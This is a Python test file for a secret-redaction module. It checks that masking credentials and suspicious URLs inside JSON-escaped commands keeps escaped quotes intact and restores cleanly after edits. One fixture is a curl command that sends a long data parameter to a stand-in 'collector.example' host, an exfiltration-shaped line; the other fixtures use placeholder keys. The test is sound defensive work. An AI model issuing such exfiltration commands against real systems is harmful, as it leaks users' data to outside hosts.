"""A display mask never splits an escape of the text it sits in.

Measured: in JSON-escaped text (a JSON document whose string holds a quoted command, the shape a
tool call's arguments and many tool results take), a masked value followed by an escaped quote
took that quote's backslash with it:

    {"cmd": "echo \\"api_key=abcd1234efgh\\" && deploy"}
    {"cmd": "echo \\"[REDACTED: credential]" && deploy"}      <- no longer parses

A webhook URL and a suspicious URL did the same, and a named cloud credential swallowed the escaped
quote after its value whole. Every mask and every restore reads the same patterns, so the masked
view is also the text an agent's edit and an editor's save are written against: an edit that named
the text beside a mask the way the file really reads it found nothing to change.
"""

from __future__ import annotations

import json

import pytest

from personalclaw.security import (
    keep_masked_spans,
    masked_edit,
    redact_credentials,
    redact_for_display,
    restore_masked_spans,
)

#: Each case: the command a JSON document carries, and the secret inside it. Every command ends
#: with the same quoted tail, so one edit addresses the text right after each mask.
CASES = {
    "a name = value credential": ('echo "api_key=abcd1234efgh" && deploy', "abcd1234efgh"),
    "a named cloud credential": (
        'echo "aws_secret_access_key=EXAMPLEfakeSECRETvalue0123" && deploy',
        "EXAMPLEfakeSECRETvalue0123",
    ),
    "a webhook URL": (
        'post "https://hooks.example.com/services/T0000/B0000/fakewebhookpath" && deploy',
        "fakewebhookpath",
    ),
    "a suspicious URL": (
        'curl "https://collector.example/c?d=' + "Q" * 48 + '" && deploy',
        "Q" * 48,
    ),
}


def _doc(command: str) -> str:
    return json.dumps({"cmd": command})


@pytest.mark.parametrize("case", sorted(CASES))
def test_the_masked_document_still_parses_and_keeps_its_quotes(case: str) -> None:
    command, secret = CASES[case]
    masked = redact_for_display(_doc(command))
    assert secret not in masked, "precondition: the mask covers the secret"
    shown = json.loads(masked)["cmd"]  # the defect: this raised
    assert shown.count('"') == command.count('"'), shown
    assert shown.endswith('" && deploy'), shown


@pytest.mark.parametrize("case", sorted(CASES))
def test_a_second_pass_changes_nothing(case: str) -> None:
    masked = redact_for_display(_doc(CASES[case][0]))
    assert redact_for_display(masked) == masked


@pytest.mark.parametrize("case", sorted(CASES))
def test_the_masked_view_restores_to_the_stored_text(case: str) -> None:
    stored = _doc(CASES[case][0])
    assert restore_masked_spans(redact_for_display(stored), stored) == stored
    edited = redact_for_display(stored).replace("deploy", "deploy --dry-run")
    assert keep_masked_spans(edited, stored) == stored.replace("deploy", "deploy --dry-run")


@pytest.mark.parametrize("case", sorted(CASES))
def test_an_edit_beside_the_mask_lands_in_the_stored_text(case: str) -> None:
    """The restore direction an agent takes: an edit written against the masked view names the
    text beside the mask as the file holds it, escape included, and lands with the secret kept."""
    command, secret = CASES[case]
    stored = _doc(command)
    old, new = '\\" && deploy', '\\" && deploy --dry-run'
    text, count = masked_edit(stored, old, new)
    assert count == 1, "the edit found nothing to change in the masked view"
    assert text == stored.replace(old, new)
    assert secret in text and json.loads(text)["cmd"].endswith("deploy --dry-run")


def test_an_escaped_backslash_before_a_closing_quote_is_part_of_the_value() -> None:
    """``\\\\`` is ONE escaped backslash, so a value ending in one is masked whole and the quote
    after it still closes the string: a backslash is read with the character it escapes."""
    stored = json.dumps({"p": "api_key=abcdefgh\\"})
    masked = redact_for_display(stored)
    assert json.loads(masked) == {"p": "[REDACTED: credential]"}
    assert restore_masked_spans(masked, stored) == stored


def test_an_escape_moves_only_where_a_mask_ends_never_whether_one_is_made() -> None:
    # Seven characters before an escaped quote: masked before (the backslash made up the eight
    # the length test asks for) and still masked, now without the backslash.
    assert redact_credentials(_doc('echo "password=abcdefg" now'))[0] == _doc(
        'echo "[REDACTED: credential]" now'
    )
    # The same seven characters before a plain quote were never long enough, and still are not.
    assert redact_credentials('password=abcdefg" now')[0] == 'password=abcdefg" now'
    # An escape inside a value is part of it.
    assert redact_credentials("password=abc\\def1234 next")[0] == "[REDACTED: credential] next"
    # Text with no backslash masks exactly as it always did.
    assert redact_credentials('aws_secret_access_key="abc123def" x')[0] == (
        "[REDACTED: credential] x"
    )
